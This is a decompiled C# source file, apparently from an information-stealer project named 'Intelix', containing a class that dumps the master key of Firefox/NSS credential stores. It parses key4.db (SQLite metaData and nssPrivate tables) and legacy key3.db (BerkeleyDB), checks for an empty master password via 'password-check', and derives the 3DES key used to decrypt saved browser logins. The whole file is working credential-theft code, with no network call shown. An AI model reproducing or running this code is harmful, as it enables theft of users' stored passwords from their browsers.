using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using Intelix.Helper.Hashing;
using Intelix.Helper.Sql;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000077 RID: 119
	public static class NssDumpMasterKey
	{
		// Token: 0x060001D8 RID: 472 RVA: 0x00017180 File Offset: 0x00015380
		public static byte[] Key4Database(string path)
		{
			Asn1Der asn1Der = new Asn1Der();
			SqLite sqLite = SqLite.ReadTable(path, "metaData");
			bool flag = sqLite == null;
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				for (int i = 0; i < sqLite.GetRowCount(); i++)
				{
					bool flag2 = sqLite.GetValue(i, 0) != "password";
					if (!flag2)
					{
						byte[] bytes = Encoding.UTF8.GetBytes(sqLite.GetValue(i, 1));
						byte[] bytes2 = Encoding.UTF8.GetBytes(sqLite.GetValue(i, 2));
						bool flag3 = bytes.Length < 1 || bytes2.Length < 1;
						if (!flag3)
						{
							Asn1DerObject asn1DerObject = asn1Der.Parse(bytes2);
							string text = asn1DerObject.ToString();
							bool flag4 = text == null;
							if (!flag4)
							{
								bool flag5 = text.Contains("2A864886F70D010C050103");
								if (flag5)
								{
									Asn1DerObject asn1DerObject2 = asn1DerObject.Objects[0];
									byte[] array;
									if (asn1DerObject2 == null)
									{
										array = null;
									}
									else
									{
										Asn1DerObject asn1DerObject3 = asn1DerObject2.Objects[0];
										if (asn1DerObject3 == null)
										{
											array = null;
										}
										else
										{
											Asn1DerObject asn1DerObject4 = asn1DerObject3.Objects[1];
											if (asn1DerObject4 == null)
											{
												array = null;
											}
											else
											{
												Asn1DerObject asn1DerObject5 = asn1DerObject4.Objects[0];
												array = ((asn1DerObject5 != null) ? asn1DerObject5.Data : null);
											}
										}
									}
									byte[] array2 = array;
									Asn1DerObject asn1DerObject6 = asn1DerObject.Objects[0];
									byte[] array3;
									if (asn1DerObject6 == null)
									{
										array3 = null;
									}
									else
									{
										Asn1DerObject asn1DerObject7 = asn1DerObject6.Objects[1];
										array3 = ((asn1DerObject7 != null) ? asn1DerObject7.Data : null);
									}
									byte[] array4 = array3;
									bool flag6 = array2 == null || array4 == null;
									if (flag6)
									{
										goto IL_494;
									}
									byte[] bytes3 = new TripleDes(array4, bytes, new byte[0], array2).Compute();
									bool flag7 = !Encoding.GetEncoding("ISO-8859-1").GetString(bytes3).StartsWith("password-check");
									if (flag7)
									{
										goto IL_494;
									}
								}
								else
								{
									bool flag8 = !text.Contains("2A864886F70D01050D");
									if (flag8)
									{
										goto IL_494;
									}
									Asn1DerObject asn1DerObject8 = asn1DerObject.Objects[0];
									byte[] array5;
									if (asn1DerObject8 == null)
									{
										array5 = null;
									}
									else
									{
										Asn1DerObject asn1DerObject9 = asn1DerObject8.Objects[0];
										if (asn1DerObject9 == null)
										{
											array5 = null;
										}
										else
										{
											Asn1DerObject asn1DerObject10 = asn1DerObject9.Objects[1];
											if (asn1DerObject10 == null)
											{
												array5 = null;
											}
											else
											{
												Asn1DerObject asn1DerObject11 = asn1DerObject10.Objects[0];
												if (asn1DerObject11 == null)
												{
													array5 = null;
												}
												else
												{
													Asn1DerObject asn1DerObject12 = asn1DerObject11.Objects[1];
													if (asn1DerObject12 == null)
													{
														array5 = null;
													}
													else
													{
														Asn1DerObject asn1DerObject13 = asn1DerObject12.Objects[0];
														array5 = ((asn1DerObject13 != null) ? asn1DerObject13.Data : null);
													}
												}
											}
										}
									}
									byte[] array6 = array5;
									Asn1DerObject asn1DerObject14 = asn1DerObject.Objects[0];
									byte[] array7;
									if (asn1DerObject14 == null)
									{
										array7 = null;
									}
									else
									{
										Asn1DerObject asn1DerObject15 = asn1DerObject14.Objects[0];
										if (asn1DerObject15 == null)
										{
											array7 = null;
										}
										else
										{
											Asn1DerObject asn1DerObject16 = asn1DerObject15.Objects[1];
											if (asn1DerObject16 == null)
											{
												array7 = null;
											}
											else
											{
												Asn1DerObject asn1DerObject17 = asn1DerObject16.Objects[2];
												if (asn1DerObject17 == null)
												{
													array7 = null;
												}
												else
												{
													Asn1DerObject asn1DerObject18 = asn1DerObject17.Objects[1];
													array7 = ((asn1DerObject18 != null) ? asn1DerObject18.Data : null);
												}
											}
										}
									}
									byte[] array8 = array7;
									Asn1DerObject asn1DerObject19 = asn1DerObject.Objects[0];
									byte[] array9;
									if (asn1DerObject19 == null)
									{
										array9 = null;
									}
									else
									{
										Asn1DerObject asn1DerObject20 = asn1DerObject19.Objects[0];
										if (asn1DerObject20 == null)
										{
											array9 = null;
										}
										else
										{
											Asn1DerObject asn1DerObject21 = asn1DerObject20.Objects[1];
											if (asn1DerObject21 == null)
											{
												array9 = null;
											}
											else
											{
												Asn1DerObject asn1DerObject22 = asn1DerObject21.Objects[3];
												array9 = ((asn1DerObject22 != null) ? asn1DerObject22.Data : null);
											}
										}
									}
									byte[] array10 = array9;
									bool flag9 = array6 == null || array8 == null || array10 == null;
									if (flag9)
									{
										goto IL_494;
									}
									byte[] bytes4 = new PBE(array10, bytes, new byte[0], array6, array8).Compute();
									bool flag10 = !Encoding.GetEncoding("ISO-8859-1").GetString(bytes4).StartsWith("password-check");
									if (flag10)
									{
										goto IL_494;
									}
								}
								sqLite = SqLite.ReadTable(path, "nssPrivate");
								bool flag11 = sqLite != null;
								if (flag11)
								{
									int num = 0;
									bool flag12 = num < sqLite.GetRowCount();
									if (flag12)
									{
										byte[] bytes5 = Encoding.UTF8.GetBytes(sqLite.GetValue(num, 6));
										Asn1DerObject asn1DerObject23 = asn1Der.Parse(bytes5);
										byte[] data = asn1DerObject23.Objects[0].Objects[0].Objects[1].Objects[0].Objects[1].Objects[0].Data;
										byte[] data2 = asn1DerObject23.Objects[0].Objects[0].Objects[1].Objects[2].Objects[1].Data;
										byte[] sourceArray = new PBE(asn1DerObject23.Objects[0].Objects[0].Objects[1].Objects[3].Data, bytes, new byte[0], data, data2).Compute();
										byte[] array11 = new byte[24];
										Array.Copy(sourceArray, array11, array11.Length);
										return array11;
									}
								}
							}
						}
					}
					IL_494:;
				}
				result = null;
			}
			return result;
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x00017640 File Offset: 0x00015840
		public static byte[] Key3Database(string path)
		{
			byte[] array = File.ReadAllBytes(path);
			bool flag = array == null;
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				Asn1Der asn1Der = new Asn1Der();
				BerkeleyDB berkeleyDB = new BerkeleyDB(array);
				string text = berkeleyDB.Keys.Where(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Key.Equals("password-check");
				}).Select(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Value;
				}).FirstOrDefault<string>();
				bool flag2 = text == null;
				if (flag2)
				{
					result = null;
				}
				else
				{
					text = text.Replace("-", null);
					int num = int.Parse(text.Substring(2, 2), NumberStyles.HexNumber) * 2;
					string hexString = text.Substring(6, num);
					int num2 = text.Length - (6 + num + 36);
					string hexString2 = text.Substring(6 + num + 4 + num2);
					string text2 = berkeleyDB.Keys.Where(delegate(KeyValuePair<string, string> p)
					{
						KeyValuePair<string, string> keyValuePair = p;
						return keyValuePair.Key.Equals("global-salt");
					}).Select(delegate(KeyValuePair<string, string> p)
					{
						KeyValuePair<string, string> keyValuePair = p;
						return keyValuePair.Value;
					}).FirstOrDefault<string>();
					bool flag3 = text2 == null;
					if (flag3)
					{
						result = null;
					}
					else
					{
						text2 = text2.Replace("-", null);
						TripleDes tripleDes = new TripleDes(NssDumpMasterKey.HexToBytes(text2), Encoding.ASCII.GetBytes(""), NssDumpMasterKey.HexToBytes(hexString));
						tripleDes.ComputeVoid();
						bool flag4 = !TripleDes.DecryptStringDesCbc(tripleDes.Key, tripleDes.Vector, NssDumpMasterKey.HexToBytes(hexString2)).StartsWith("password-check");
						if (flag4)
						{
							result = null;
						}
						else
						{
							string text3 = berkeleyDB.Keys.Where(delegate(KeyValuePair<string, string> p)
							{
								KeyValuePair<string, string> keyValuePair = p;
								if (!keyValuePair.Key.Equals("global-salt"))
								{
									keyValuePair = p;
									if (!keyValuePair.Key.Equals("Version"))
									{
										keyValuePair = p;
										return !keyValuePair.Key.Equals("password-check");
									}
								}
								return false;
							}).Select(delegate(KeyValuePair<string, string> p)
							{
								KeyValuePair<string, string> keyValuePair = p;
								return keyValuePair.Value;
							}).FirstOrDefault<string>();
							bool flag5 = text3 == null;
							if (flag5)
							{
								result = null;
							}
							else
							{
								text3 = text3.Replace("-", "");
								Asn1DerObject asn1DerObject = asn1Der.Parse(NssDumpMasterKey.HexToBytes(text3));
								TripleDes tripleDes2 = new TripleDes(NssDumpMasterKey.HexToBytes(text2), Encoding.ASCII.GetBytes(""), asn1DerObject.Objects[0].Objects[0].Objects[1].Objects[0].Data);
								tripleDes2.ComputeVoid();
								byte[] toParse = TripleDes.DecryptByteDesCbc(tripleDes2.Key, tripleDes2.Vector, asn1DerObject.Objects[0].Objects[1].Data);
								Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse);
								Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.Objects[0].Objects[2].Data);
								byte[] array2 = new byte[24];
								bool flag6 = asn1DerObject3.Objects[0].Objects[3].Data.Length > 24;
								if (flag6)
								{
									Array.Copy(asn1DerObject3.Objects[0].Objects[3].Data, asn1DerObject3.Objects[0].Objects[3].Data.Length - 24, array2, 0, 24);
								}
								else
								{
									array2 = asn1DerObject3.Objects[0].Objects[3].Data;
								}
								result = array2;
							}
						}
					}
				}
			}
			return result;
		}

		// Token: 0x060001DA RID: 474 RVA: 0x000179F4 File Offset: 0x00015BF4
		public static byte[] HexToBytes(string hexString)
		{
			bool flag = hexString.Length % 2 != 0;
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				byte[] array = new byte[hexString.Length / 2];
				for (int i = 0; i < array.Length; i++)
				{
					string s = hexString.Substring(i * 2, 2);
					array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
				}
				result = array;
			}
			return result;
		}
	}
}
